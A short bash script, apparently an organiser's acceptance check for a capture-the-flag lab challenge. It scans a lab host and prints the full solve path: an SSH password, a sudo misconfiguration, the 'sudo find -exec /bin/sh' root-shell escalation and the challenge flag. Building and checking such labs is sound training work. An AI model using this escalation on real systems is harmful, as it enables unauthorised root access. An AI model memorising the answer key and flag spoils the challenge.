#!/usr/bin/env bash
# Admin acceptance check for HX-06 (run from the Kali participant box).
set -u
TARGET="10.10.20.60"
echo "[*] nmap - only ssh should be open:"
nmap -p- --open "$TARGET"
echo "[*] expected solve path:"
echo "    ssh vault@$TARGET            # password GRINGOTTS-472"
echo "    sudo -l                      # shows: (root) NOPASSWD: /usr/bin/find"
echo "    sudo find . -exec /bin/sh \\; -quit"
echo "    cat /root/final_fragment.txt # HORCRUX{g0bl1n_m4d3_v4ult_0wn3d}"
